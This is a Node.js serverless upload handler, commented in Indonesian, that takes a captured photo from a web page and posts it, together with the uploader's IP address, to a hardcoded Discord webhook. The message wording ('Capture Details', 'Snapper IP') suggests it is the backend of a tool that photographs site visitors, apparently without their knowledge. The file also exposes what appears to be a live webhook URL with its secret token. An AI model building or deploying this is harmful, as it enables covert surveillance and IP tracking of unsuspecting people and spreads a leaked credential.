// api/upload.js
import fetch, { FormData, Blob } from 'node-fetch'; // Pastikan node-fetch terinstal jika Node.js versi lama, tapi Vercel biasanya sudah mendukung native fetch/FormData

export default async function handler(req, res) {
    // Pastikan hanya menerima permintaan POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { image } = req.body; // Kita mengharapkan data gambar base64 dari frontend

    if (!image) {
        return res.status(400).json({ message: 'Image data is required.' });
    }

    // *** WEBHOOK_URL milikmu sudah disematkan di sini! ***
    // Ini adalah URL webhook tujuanmu, misalnya webhook Discord, Telegram bot API, atau server kustom.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1447229621811679353/YoOxyqkm56ouRGiloxpgvclABodnA6RdxM1bi6hZJ8Qr6DoRO8YlLp62MSHtZcRLg4LQ';

    // Kita tidak perlu memeriksa process.env.WEBHOOK_URL lagi karena sudah disematkan langsung.
    // Namun, dalam skenario nyata, menggunakan variabel lingkungan lebih aman dan fleksibel.
    // Untuk tujuan kita sekarang, ini sudah sempurna!

    try {
        // Ekstrak data base64 dari string gambar
        const base64Data = image.split(',')[1]; // Hapus prefix "data:image/jpeg;base64,"
        const buffer = Buffer.from(base64Data, 'base64'); // Konversi base64 ke Buffer

        const filename = `sando-ai-photo-${Date.now()}.jpeg`; // Nama file unik
        
        const formData = new FormData();
        // Tambahkan gambar sebagai file ke FormData
        formData.append('file', new Blob([buffer], { type: 'image/jpeg' }), filename);
        
        // Tambahkan payload JSON untuk pesan dan embed (khusus Discord)
        formData.append('payload_json', JSON.stringify({
            content: 'Foto lucu baru aja dijepret',
            embeds: [{
                title: 'Detail Tangkapan',
                description: `Waktu Jepret: ${new Date().toISOString()}\nIP Penjepret: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}`,
                color: 16711935 // Warna ungu untuk embed Discord
            }]
        }));

        // Kirim data ke webhook tujuan
        const webhookResponse = await fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData,
            // Header Content-Type: multipart/form-data akan otomatis diatur oleh fetch dengan FormData
        });

        if (webhookResponse.ok) {
            console.log('Image successfully sent to webhook!');
            return res.status(200).json({ message: 'Photo captured and sent!' });
        } else {
            const webhookErrorText = await webhookResponse.text();
            console.error('Failed to send image to webhook:', webhookResponse.status, webhookErrorText);
            return res.status(500).json({ message: 'Failed to forward photo to destination.', details: webhookErrorText });
        }

    } catch (error) {
        console.error('Error processing image upload:', error);
        return res.status(500).json({ message: 'Internal server error.', error: error.message });
    }
}